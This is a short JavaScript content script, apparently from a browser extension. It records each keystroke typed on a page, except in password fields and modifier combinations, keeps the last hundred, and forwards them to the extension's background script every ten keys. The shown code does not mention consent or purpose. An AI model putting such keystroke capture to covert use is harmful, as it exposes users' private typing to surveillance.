// Track last 100 keystrokes
const keystrokes = [];

document.addEventListener('keydown', (event) => {
  // Skip special keys and password fields
  if (event.ctrlKey || event.altKey || event.metaKey) return;
  if (event.target.type === 'password') return;


  console.log('Key pressed:', keystrokes); // Debugging line
  // Record keystroke with timestamp
  keystrokes.push({
    key: event.key,
    time: Date.now()
  });

  // Keep only recent keystrokes
  if (keystrokes.length > 100) {
    keystrokes.shift();
  }

  // Send to background every 10 keystrokes
  try{if (keystrokes.length % 10 === 0) {
    chrome.runtime.sendMessage({
      type: 'KEYSTROKES_UPDATE',
      keystrokes: keystrokes.slice() // Send copy
    });
  }}catch(e){console.log(e)} // Debugging line
  
});